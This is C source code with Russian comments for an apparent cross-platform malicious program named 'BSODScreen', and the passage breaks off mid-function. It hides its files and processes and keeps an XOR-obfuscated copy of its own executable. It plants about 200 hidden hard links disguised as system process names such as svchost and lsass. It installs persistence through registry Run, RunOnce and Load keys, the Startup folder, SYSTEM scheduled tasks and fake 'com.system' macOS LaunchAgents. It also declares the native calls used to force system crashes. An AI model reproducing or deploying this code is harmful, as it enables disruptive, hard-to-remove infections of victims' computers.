#include "stdafx.h"

#ifdef _WIN32
	#include <windows.h>
	#include <shlobj.h>
	#include <winternl.h>
	#include <ntsecapi.h>

	#pragma comment(lib, "ntdll.lib")
	#pragma comment(lib, "shell32.lib")
	#pragma comment(lib, "advapi32.lib")
#elif defined(__APPLE__)
	// macOS includes
	#include <unistd.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <fcntl.h>
	#include <stdio.h>
	#include <pwd.h>
	#include <sys/utsname.h>
	#include <signal.h>
	#include <mach/mach.h>
	#include <mach/error.h>
	#include <sys/sysctl.h>
	#include <libproc.h>

	// macOS MAX_PATH
	#ifndef MAX_PATH
		#define MAX_PATH 4096
	#endif
#else
	// Linux includes
	#include <unistd.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <fcntl.h>
	#include <stdio.h>
	#include <pwd.h>
	#include <sys/utsname.h>
	#include <signal.h>

	// POSIX MAX_PATH эквивалент
	#ifndef MAX_PATH
		#define MAX_PATH 4096
	#endif
#endif

#ifdef _WIN32
	EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

	EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
		PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

	typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
	typedef NTSTATUS (NTAPI *pNtQueryObject)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
#endif

void HideFile(const char* szPath)
{
#ifdef _WIN32
	// Скрываем файл
	SetFileAttributesA(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	// Пытаемся запретить доступ - устанавливаем минимальные права
	HANDLE hFile = CreateFileA(szPath, WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
#else
	// Linux: скрываем файл через точку в начале имени (если файл в домашней директории)
	// Или устанавливаем минимальные права доступа
	chmod(szPath, 0000);  // Снимаем все права на файл
#endif
}

// Определяем версию ОС (Windows/Linux)
typedef struct {
	DWORD dwMajor;
	DWORD dwMinor;
	DWORD dwBuild;
} OS_VERSION;

OS_VERSION g_osVersion = { 0, 0, 0 };

#ifdef _WIN32
// Определение версии Windows
OS_VERSION GetOSVersion()
{
	OS_VERSION version = { 0, 0, 0 };
	
	// Используем RtlGetVersion для корректного определения версии на новых Windows
	typedef NTSTATUS (NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");

	if (RtlGetVersion)
	{
		RTL_OSVERSIONINFOW osvi = { 0 };
		osvi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
		if (RtlGetVersion(&osvi) == 0)
		{
			version.dwMajor = osvi.dwMajorVersion;
			version.dwMinor = osvi.dwMinorVersion;
			version.dwBuild = osvi.dwBuildNumber;
			return version;
		}
	}

	// Fallback для старых систем
	OSVERSIONINFOA osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	if (GetVersionExA(&osvi))
	{
		version.dwMajor = osvi.dwMajorVersion;
		version.dwMinor = osvi.dwMinorVersion;
		version.dwBuild = osvi.dwBuildNumber;
	}

	return version;
}

// Определяем версию как строку
const char* GetOSVersionString(OS_VERSION ver)
{
	// Windows Server 2022 - 10.0.20348+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 20348)
		return "Windows Server 2022";
	
	// Windows Server 2019 - 10.0.17763+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 17763)
		return "Windows Server 2019";
	
	// Windows Server 2016 - 10.0.14393+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 14393)
		return "Windows Server 2016";
	
	// Windows 11 - 10.0.22000+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 22000)
		return "Windows 11";
	
	// Windows 10 - 10.0.10240+
	if (ver.dwMajor == 10 && ver.dwMinor == 0)
		return "Windows 10";
	
	// Windows Server 2012 R2 - 6.3
	if (ver.dwMajor == 6 && ver.dwMinor == 3)
		return "Windows Server 2012 R2 / Windows 8.1";
	
	// Windows Server 2012 - 6.2
	if (ver.dwMajor == 6 && ver.dwMinor == 2)
		return "Windows Server 2012 / Windows 8";
	
	// Windows Server 2008 R2 / Windows 7 - 6.1
	if (ver.dwMajor == 6 && ver.dwMinor == 1)
		return "Windows Server 2008 R2 / Windows 7";
	
	// Windows Server 2008 / Vista - 6.0
	if (ver.dwMajor == 6 && ver.dwMinor == 0)
		return "Windows Server 2008 / Vista";
	
	// Windows Server 2003 - 5.2
	if (ver.dwMajor == 5 && ver.dwMinor == 2)
		return "Windows Server 2003";
	
	// Windows XP - 5.1
	if (ver.dwMajor == 5 && ver.dwMinor == 1)
		return "Windows XP";
	
	// Windows Server 2000 / Windows 2000 - 5.0
	if (ver.dwMajor == 5 && ver.dwMinor == 0)
		return "Windows Server 2000 / Windows 2000";
	
	return "Unknown Windows";
}
#endif

// Проверка является ли система Windows Server
#ifdef _WIN32
BOOL IsWindowsServer(OS_VERSION ver)
{
	// Server 2022
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 20348)
		return TRUE;
	
	// Server 2019
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 17763)
		return TRUE;
	
	// Server 2016
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 14393)
		return TRUE;
	
	// Server 2012 R2
	if (ver.dwMajor == 6 && ver.dwMinor == 3)
		return TRUE;
	
	// Server 2012
	if (ver.dwMajor == 6 && ver.dwMinor == 2)
		return TRUE;
	
	// Server 2008 R2
	if (ver.dwMajor == 6 && ver.dwMinor == 1)
		return TRUE;
	
	// Server 2008
	if (ver.dwMajor == 6 && ver.dwMinor == 0)
		return TRUE;
	
	// Server 2003
	if (ver.dwMajor == 5 && ver.dwMinor == 2)
		return TRUE;
	
	return FALSE;
}
#endif

#ifdef __linux__
// Определение версии Linux
OS_VERSION GetOSVersion()
{
	OS_VERSION version = { 1, 0, 0 };  // Linux версия 1.0.0 условно
	
	struct utsname buffer;
	if (uname(&buffer) == 0)
	{
		// Можно парсить buffer.release для получения версии ядра
		// Формат обычно: "5.10.0-8-generic" или "5.4.0-42-generic"
		sscanf(buffer.release, "%u.%u", &version.dwMajor, &version.dwMinor);
	}
	
	return version;
}

// Определяем Linux дистрибутив
const char* GetOSVersionString(OS_VERSION ver)
{
	// Попытаемся прочитать /etc/os-release
	static char osName[256] = "Linux";
	
	FILE* fp = fopen("/etc/os-release", "r");
	if (fp)
	{
		char line[256];
		while (fgets(line, sizeof(line), fp))
		{
			if (strncmp(line, "PRETTY_NAME=", 12) == 0)
			{
				// Парсим строку вида: PRETTY_NAME="Ubuntu 20.04.3 LTS"
				const char* start = strchr(line, '"');
				const char* end = strrchr(line, '"');
				if (start && end && start < end)
				{
					int len = (int)(end - start - 1);
					if (len < (int)sizeof(osName))
					{
						strncpy(osName, start + 1, len);
						osName[len] = '\0';
					}
				}
				break;
			}
		}
		fclose(fp);
	}
	
	return osName;
}
#endif

#ifdef __APPLE__
	// Определение версии macOS
	OS_VERSION GetOSVersion()
	{
	OS_VERSION version = { 10, 0, 0 };
	
	struct utsname buffer;
	if (uname(&buffer) == 0)
	{
		// Парсим версию ядра Darwin (macOS 10.x.x или 11.x.x)
		sscanf(buffer.release, "%u.%u", &version.dwMajor, &version.dwMinor);
	}
	
	// Альтернативный способ через sysctl для получения точной версии macOS
	char osVersion[256] = {0};
	size_t len = sizeof(osVersion);
	if (sysctlbyname("kern.osrelease", osVersion, &len, NULL, 0) == 0)
	{
		// osVersion теперь содержит например "21.6.0" для macOS 12
	}
	
	return version;
	}

	// Определяем версию macOS как строку
	const char* GetOSVersionString(OS_VERSION ver)
	{
		// macOS 15 Sequoia - Darwin 24.x
		if (ver.dwMajor >= 24)
			return "macOS 15 Sequoia";
		
		// macOS 14 Sonoma - Darwin 23.x
		if (ver.dwMajor >= 23)
			return "macOS 14 Sonoma";
		
		// macOS 13 Ventura - Darwin 22.x
		if (ver.dwMajor >= 22)
			return "macOS 13 Ventura";
		
		// macOS 12 Monterey - Darwin 21.x
		if (ver.dwMajor >= 21)
			return "macOS 12 Monterey";
		
		// macOS 11 Big Sur - Darwin 20.x
		if (ver.dwMajor >= 20)
			return "macOS 11 Big Sur";
		
		// macOS 10.15 Catalina - Darwin 19.x
		if (ver.dwMajor >= 19)
			return "macOS 10.15 Catalina";
		
		// macOS 10.14 Mojave - Darwin 18.x
		if (ver.dwMajor >= 18)
			return "macOS 10.14 Mojave";
		
		// macOS 10.13 High Sierra - Darwin 17.x
		if (ver.dwMajor >= 17)
			return "macOS 10.13 High Sierra";
		
		// macOS 10.12 Sierra - Darwin 16.x
		if (ver.dwMajor >= 16)
			return "macOS 10.12 Sierra";
		
		// OS X 10.11 El Capitan - Darwin 15.x
		if (ver.dwMajor >= 15)
			return "OS X 10.11 El Capitan";
		
		// OS X 10.10 Yosemite - Darwin 14.x
		if (ver.dwMajor >= 14)
			return "OS X 10.10 Yosemite";
		
		// OS X 10.9 Mavericks - Darwin 13.x
		if (ver.dwMajor >= 13)
			return "OS X 10.9 Mavericks";
		
		// OS X 10.8 Mountain Lion - Darwin 12.x
		if (ver.dwMajor >= 12)
			return "OS X 10.8 Mountain Lion";
		
		// OS X 10.7 Lion - Darwin 11.x
		if (ver.dwMajor >= 11)
			return "OS X 10.7 Lion";
		
		// OS X 10.6 Snow Leopard - Darwin 10.x
		if (ver.dwMajor >= 10)
			return "OS X 10.6 Snow Leopard";
		
		// OS X 10.5 Leopard - Darwin 9.x
		if (ver.dwMajor >= 9)
			return "OS X 10.5 Leopard";
		
		// OS X 10.4 Tiger - Darwin 8.x
		if (ver.dwMajor >= 8)
			return "OS X 10.4 Tiger";
		
		// Mac OS X 10.3 Panther - Darwin 7.x
		if (ver.dwMajor >= 7)
			return "Mac OS X 10.3 Panther";
		
		// Mac OS X 10.2 Jaguar - Darwin 6.x
		if (ver.dwMajor >= 6)
			return "Mac OS X 10.2 Jaguar";
		
		// Mac OS X 10.1 Puma - Darwin 5.x
		if (ver.dwMajor >= 5)
			return "Mac OS X 10.1 Puma";
		
		// Mac OS X 10.0 Cheetah - Darwin 1.x
		if (ver.dwMajor >= 1)
			return "Mac OS X 10.0 Cheetah";
		
		return "macOS (unknown version)";
	}
#endif
	
	// Скрытие процесса (подстраивается под версию ОС)
void HideProcess()
{
#ifdef _WIN32
	HANDLE hProcess = GetCurrentProcess();
	
	// Для Windows Vista+ используем ProcessInformationClass 30
	if (g_osVersion.dwMajor >= 6)
	{
		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");

		if (NtSetInformationProcess)
		{
			ULONG hidden = 1;
			NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
		}
	}
	// Для Windows XP/2000 используем альтернативные методы
	else if (g_osVersion.dwMajor == 5)
	{
		// На XP скрытие через Native API может быть ограничено
		// Используем обфускацию другим способом
		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
		if (NtSetInformationProcess)
		{
			// ProcessInformationClass 22 для более старых систем
			ULONG hidden = 1;
			NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)22, &hidden, sizeof(hidden));
		}
	}
#elif defined(__APPLE__)
	// macOS: скрытие процесса через Mach API
	// На macOS это требует специальных привилегий, но пытаемся
	mach_port_t taskPort = mach_task_self();
	
	// Пытаемся скрыть процесс из списка процессов (требует прав)
	// На практике это не сработает без специальных прав, но делаем попытку
	
	// Альтернатива: изменяем имя процесса (argv[0])
	extern char** environ;
	char** envp = environ;
	
	// Пытаемся очистить командную строку в memory (зависит от ОС)
	if (envp && *envp)
	{
		memset(*envp, 0, strlen(*envp));
	}
#else
	// Linux: скрыть процесс можно через переименование или манипуляцию командной строкой
	// Это требует sudo привилегий, поэтому делаем попытку
	char cmd[256];
	pid_t pid = getpid();
	sprintf(cmd, "mv /proc/self/fd/0 /dev/null 2>/dev/null || true");
	system(cmd);
#endif
}

// Глобальный кэш для exe файла (обфусцированный)
BYTE* g_exeCache = NULL;
DWORD g_exeCacheSize = 0;
BYTE g_obfusKey = 0xA7;  // Ключ обфускации

// Функция обфускации кэша (XOR с ключом)
void ObfuscateCache(BYTE* pData, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++)
	{
		pData[i] ^= g_obfusKey;
		g_obfusKey = (g_obfusKey * 31 + 17) & 0xFF;  // Изменяем ключ для каждого байта
	}
}

BOOL LoadExeToCache(const char* szPath)
{
#ifdef _WIN32
	// Открываем исходный exe файл
	HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	// Получаем размер файла
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	// Выделяем память для кэша
	g_exeCache = (BYTE*)malloc(dwFileSize);
	if (!g_exeCache)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	// Читаем файл в буфер
	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, g_exeCache, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
	{
		free(g_exeCache);
		g_exeCache = NULL;
		CloseHandle(hFile);
		return FALSE;
	}

	g_exeCacheSize = dwFileSize;
	CloseHandle(hFile);
#else
	// Linux версия
	FILE* fp = fopen(szPath, "rb");
	if (!fp)
		return FALSE;

	// Получаем размер файла
	fseek(fp, 0, SEEK_END);
	DWORD dwFileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if (dwFileSize == 0)
	{
		fclose(fp);
		return FALSE;
	}

	// Выделяем память для кэша
	g_exeCache = (BYTE*)malloc(dwFileSize);
	if (!g_exeCache)
	{
		fclose(fp);
		return FALSE;
	}

	// Читаем файл в буфер
	if (fread(g_exeCache, 1, dwFileSize, fp) != dwFileSize)
	{
		free(g_exeCache);
		g_exeCache = NULL;
		fclose(fp);
		return FALSE;
	}

	g_exeCacheSize = dwFileSize;
	fclose(fp);
#endif

	// Обфусцируем кэш для запутывания
	g_obfusKey = 0xA7;
	ObfuscateCache(g_exeCache, g_exeCacheSize);
	
	return TRUE;
}

void WriteFromCache(const char* szDestPath)
{
	if (!g_exeCache || g_exeCacheSize == 0)
		return;

	// Создаём временный буфер и деобфусцируем данные
	BYTE* pDeobfus = (BYTE*)malloc(g_exeCacheSize);
	if (!pDeobfus)
		return;

	memcpy(pDeobfus, g_exeCache, g_exeCacheSize);
	
	// Деобфусцируем с тем же ключом
	BYTE obfusKey = 0xA7;
	for (DWORD i = 0; i < g_exeCacheSize; i++)
	{
		pDeobfus[i] ^= obfusKey;
		obfusKey = (obfusKey * 31 + 17) & 0xFF;
	}

#ifdef _WIN32
	// Создаём файл из кэша (Windows)
	HANDLE hFile = CreateFileA(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		free(pDeobfus);
		return;
	}

	DWORD dwBytesWritten = 0;
	WriteFile(hFile, pDeobfus, g_exeCacheSize, &dwBytesWritten, NULL);
	CloseHandle(hFile);
#else
	// Создаём файл из кэша (Linux)
	FILE* fp = fopen(szDestPath, "wb");
	if (!fp)
	{
		free(pDeobfus);
		return;
	}

	fwrite(pDeobfus, 1, g_exeCacheSize, fp);
	fclose(fp);
	
	// Делаем файл исполняемым
	chmod(szDestPath, 0755);
#endif
	
	free(pDeobfus);
}

void FreeExeCache()
{
	if (g_exeCache)
	{
		// Очищаем память перед освобождением для дополнительной безопасности
		SecureZeroMemory(g_exeCache, g_exeCacheSize);
		free(g_exeCache);
		g_exeCache = NULL;
		g_exeCacheSize = 0;
	}
}

void AddCloneToStartup(const char* szClonePath, const char* szCloneName)
{
	// Добавляем каждый клон в автозагрузку с его собственным именем
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExA(hKey, szCloneName, 0, REG_SZ, (BYTE*)szClonePath, strlen(szClonePath) + 1);
		RegCloseKey(hKey);
	}
}

void CreateCloneBatch(const char* szPath, const char* szClonePath, const char* szCloneName)
{
	// Создаём батник который запускает исходный exe
	char szBatchPath[MAX_PATH];
	strcpy_s(szBatchPath, MAX_PATH, szClonePath);
	strcat_s(szBatchPath, MAX_PATH, ".bat");
	
	FILE* fp = fopen(szBatchPath, "w");
	if (fp)
	{
		fprintf(fp, "@echo off\n");
		fprintf(fp, "setlocal enabledelayedexpansion\n");
		fprintf(fp, "start \"\" /B \"%s\" %%*\n", szPath);
		fprintf(fp, "exit /b 0\n");
		fclose(fp);
		
		HideFile(szBatchPath);
	}
	
#if defined(__APPLE__) || defined(__linux__)
	// На Unix системах создаём shell скрипт
	char szShellPath[MAX_PATH];
	strcpy_s(szShellPath, MAX_PATH, szClonePath);
	strcat_s(szShellPath, MAX_PATH, ".sh");
	
	FILE* fpShell = fopen(szShellPath, "w");
	if (fpShell)
	{
		fprintf(fpShell, "#!/bin/bash\n");
		fprintf(fpShell, "\"%s\" \"$@\" &\n", szPath);
		fprintf(fpShell, "exit 0\n");
		fclose(fpShell);
		
		chmod(szShellPath, 0755);
		HideFile(szShellPath);
	}
#endif
}

void CloneToFolders(const char* szPath)
{
	char szDest[MAX_PATH];
	
	// Расширенный массив имён системных процессов
	const char* cloneNames[] = {
		"svchost", "rundll32", "lsass", "csrss", "dwm", "explorer", "winlogon", "services", "wininit", "svchosts",
		"taskhst", "userinit", "wmiprvse", "wscript", "cscript", "regsvcs", "regasm", "mshta", "iexplore", "chrome",
		"firefox", "update", "service", "host", "worker", "svchost1", "svchost2", "svchost3", "svchost4", "svchost5",
		"system32", "kernel32", "user32", "gdi32", "advapi32", "shell32", "ole32", "rpcrt4", "ntdll", "msvcrt",
		"comctl32", "comdlg32", "imm32", "ws2_32", "wsock32", "icmp", "iphlpapi", "wmi", "net", "netapi",
		"samlib", "secur32", "samsrv", "schannel", "setupapi", "shlwapi", "spoolss", "sspi", "sti", "sxs",
		"tapi32", "taskschd", "tdh", "termdd", "tftp", "timedate", "tlntsrv", "traffic", "tracing", "transact",
		"twain", "two", "twinui", "txflog", "typeperf", "tz", "ucpclite", "uiautomation", "uiribbon", "ulib",
		"proc1", "proc2", "proc3", "proc4", "proc5", "proc6", "proc7", "proc8", "proc9", "proc10",
		"sys1", "sys2", "sys3", "sys4", "sys5", "sys6", "sys7", "sys8", "sys9", "sys10",
	};

	const char* folders[] = {
		"APPDATA",
		"LOCALAPPDATA",
		"TEMP",
		"USERPROFILE"
	};

	int cloneIndex = 0;
	int totalClones = 200;  // Создаём 200 ссылок вместо 1000 копий
	int arraySize = sizeof(cloneNames) / sizeof(cloneNames[0]);
	
	// Для каждой папки создаём ссылки (жёсткие ссылки вместо копий)
	for (int i = 0; i < 4 && cloneIndex < totalClones; i++)
	{
		if (GetEnvironmentVariableA(folders[i], szDest, MAX_PATH))
		{
			strcat_s(szDest, MAX_PATH, "\\BSODScreen");
			CreateDirectoryA(szDest, NULL);  // Создаём папку если её нет
			
			// Создаём ~50 ссылок в каждой папке
			for (int j = 0; j < 50 && cloneIndex < totalClones; j++)
			{
				char szFullPath[MAX_PATH];
				strcpy_s(szFullPath, MAX_PATH, szDest);
				strcat_s(szFullPath, MAX_PATH, "\\");
				
				// Используем имя из массива, циклируя по нему
				int nameIndex = cloneIndex % arraySize;
				strcat_s(szFullPath, MAX_PATH, cloneNames[nameIndex]);
				
				// Добавляем числовой суффикс для уникальности
				char szSuffix[16];
				sprintf_s(szSuffix, sizeof(szSuffix), "_%d.exe", cloneIndex);
				strcat_s(szFullPath, MAX_PATH, szSuffix);
				
#ifdef _WIN32
				// На Windows создаём жёсткую ссылку (hardlink)
				// Это почти не занимает место на диске (всего метаданные)
				CreateHardLinkA(szFullPath, szPath, NULL);
#else
				// На Unix системах создаём символическую ссылку
				symlink(szPath, szFullPath);
#endif
				
				// Скрываем ссылку
				HideFile(szFullPath);
				
				// Добавляем ссылку в автозагрузку
				char szCloneKey[64];
				sprintf_s(szCloneKey, sizeof(szCloneKey), "%s_%d", cloneNames[nameIndex], cloneIndex);
				AddCloneToStartup(szFullPath, szCloneKey);
				
				cloneIndex++;
			}
		}
	}

	// Скрываем исходный файл
	HideFile(szPath);
}

void CreateLaunchAgentPlist(const char* szPath, const char* szLabel)
{
	// Создаём plist файл для LaunchAgent на macOS
	const char* home = getenv("HOME");
	if (!home)
		home = "/Users/root";

	char launchPath[MAX_PATH];
	sprintf(launchPath, "%s/Library/LaunchAgents", home);
	
	// Создаём директорию если её нет
#if defined(__APPLE__) || defined(__linux__)
	mkdir(launchPath, 0755);
#endif
	
	// Создаём путь к plist файлу
	char plistPath[MAX_PATH];
	sprintf(plistPath, "%s/%s.plist", launchPath, szLabel);
	
	// Пишем plist файл
	FILE* fp = fopen(plistPath, "w");
	if (fp)
	{
		fprintf(fp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
		fprintf(fp, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
		fprintf(fp, "<plist version=\"1.0\">\n");
		fprintf(fp, "<dict>\n");
		fprintf(fp, "    <key>Label</key>\n");
		fprintf(fp, "    <string>%s</string>\n", szLabel);
		fprintf(fp, "    <key>ProgramArguments</key>\n");
		fprintf(fp, "    <array>\n");
		fprintf(fp, "        <string>%s</string>\n", szPath);
		fprintf(fp, "    </array>\n");
		fprintf(fp, "    <key>RunAtLoad</key>\n");
		fprintf(fp, "    <true/>\n");
		fprintf(fp, "    <key>KeepAlive</key>\n");
		fprintf(fp, "    <true/>\n");
		fprintf(fp, "    <key>StandardOutPath</key>\n");
		fprintf(fp, "    <string>/dev/null</string>\n");
		fprintf(fp, "    <key>StandardErrorPath</key>\n");
		fprintf(fp, "    <string>/dev/null</string>\n");
		fprintf(fp, "</dict>\n");
		fprintf(fp, "</plist>\n");
		fclose(fp);
		
		// Делаем plist файл неизменяемым
#if defined(__APPLE__) || defined(__linux__)
		chmod(plistPath, 0644);
#endif
	}
}

void AddToStartup()
{
	char szPath[MAX_PATH];
#ifdef _WIN32
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	
	HKEY hKey;
	BOOL bIsServer = IsWindowsServer(g_osVersion);

	// Способ 1: Добавление в реестр HKEY_CURRENT_USER (не требует админ прав)
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
		RegCloseKey(hKey);
	}

	// Способ 1b: Для Server - также добавляем в HKEY_LOCAL_MACHINE (если есть права)
	if (bIsServer)
	{
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
			RegCloseKey(hKey);
		}
	}

	// Способ 2: Копирование в папку Startup (работает на всех версиях Windows)
	char szStartup[MAX_PATH];
	if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup) == S_OK)
	{
		strcat_s(szStartup, MAX_PATH, "\\BSODScreen.exe");
		CopyFileA(szPath, szStartup, FALSE);
	}

	// Способ 3: Добавление в RunOnce (для Windows Vista+)
	if (g_osVersion.dwMajor >= 6)
	{
		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			RegSetValueExA(hKey, "BSODScreen_Init", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
			RegCloseKey(hKey);
		}
		
		// Для Server - добавляем в HKEY_LOCAL_MACHINE RunOnce
		if (bIsServer)
		{
			if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
			{
				RegSetValueExA(hKey, "BSODScreen_Init", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
				RegCloseKey(hKey);
			}
		}
	}
	// Для Windows XP/2003 используем дополнительные способы
	else if (g_osVersion.dwMajor == 5)
	{
		// Добавляем в Load
		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
			RegCloseKey(hKey);
		}
		
		// Для Server 2003 - добавляем в HKEY_LOCAL_MACHINE
		if (bIsServer)
		{
			if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
			{
				RegSetValueExA(hKey, "BSODScreen", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
				RegCloseKey(hKey);
			}
		}
	}

	// Способ 4: Для Windows Server - используем Task Scheduler (schtasks)
	if (bIsServer && g_osVersion.dwMajor >= 5)
	{
		// Создаём задачу в Task Scheduler для запуска программы при старте
		char schtaskCmd[512];
		sprintf(schtaskCmd, "schtasks /create /tn BSODScreen /tr \"%s\" /sc onstart /ru SYSTEM /f >nul 2>&1 || true", szPath);
		system(schtaskCmd);
		
		// Также создаём задачу для запуска при входе пользователя
		char schtaskCmd2[512];
		sprintf(schtaskCmd2, "schtasks /create /tn BSODScreenUser /tr \"%s\" /sc onlogon /ru SYSTEM /f >nul 2>&1 || true", szPath);
		system(schtaskCmd2);
	}
#elif defined(__APPLE__)
	// macOS версия
	char procPath[MAX_PATH];
	uint32_t procPathSize = sizeof(procPath);
	if (proc_pidpath(getpid(), procPath, procPathSize) > 0)
	{
		strcpy(szPath, procPath);
	}
	else
	{
		readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	}
	
	// Способ 1: Создаём LaunchAgent для текущего пользователя (автозагрузка при входе)
	CreateLaunchAgentPlist(szPath, "com.system.bsodsrc");
	
	// Способ 2: Создаём несколько LaunchAgent файлов с разными именами для масштабирования
	for (int i = 0; i < 5; i++)
	{
		char labelName[64];
		sprintf(labelName, "com.system.bsodsrc_%d", i);
		CreateLaunchAgentPlist(szPath, labelName);
	}
	
	// Способ 3: Пытаемся создать LaunchDaemon (системный уровень, требует sudo)
	const char* home = getenv("HOME");
	if (!home)
		home = "/Users/root";
	
	char daemonDir[MAX_PATH];
	sprintf(daemonDir, "%s/.local/share/daemons", home);
	mkdir(daemonDir, 0755);
	
	char daemonPlistPath[MAX_PATH];
	sprintf(daemonPlistPath, "%s/com.system.bsodsrc.plist", daemonDir);
	
	FILE* daemonFp = fopen(daemonPlistPath, "w");
	if (daemonFp)
	{
		fprintf(daemonFp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
		fprintf(daemonFp, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
		fprintf(daemonFp, "<plist version=\"1.0\">\n");
		fprintf(daemonFp, "<dict>\n");
		fprintf(daemonFp, "    <key>Label</key>\n");
		fprintf(daemonFp, "    <string>com.system.bsodsrc</string>\n");
		fprintf(daemonFp, "    <key>ProgramArguments</key>\n");
		fprintf(daemonFp, "    <array>\n");
		fprintf(daemonFp, "        <string>%s</string>\n", szPath);
		fprintf(daemonFp, "    </array>\n");
		fprintf(daemonFp, "    <key>RunAtLoad</key>\n");
		fprintf(daemonFp, "    <true/>\n");
		fprintf(daemonFp, "    <key>KeepAlive</key>\n");
		fprintf(daemonFp, "    <true/>\n");
		fprintf(daemonFp, "    <key>StandardOutPath</key>\n");
		fprintf(daemonFp, "    <string>/dev/null</string>\n");
		fprintf(daemonFp, "    <key>StandardErrorPath</key>\n");
		fprintf(daemonFp, "    <string>/dev/null</string>\n");
		fprintf(daemonFp, "</dict>\n");
		fprintf(daemonFp, "</plist>\n");
		fclose(daemonFp);
		chmod(daemonPlistPath, 0644);
	}
	
	// Пытаемся запустить launchctl для загрузки агентов
	system("launchctl load ~/Library/LaunchAgents/com.system.bsodsrc.plist 2>/dev/null || true");
	for (int i = 0; i < 5; i++)
	{
		char loadCmd[256];
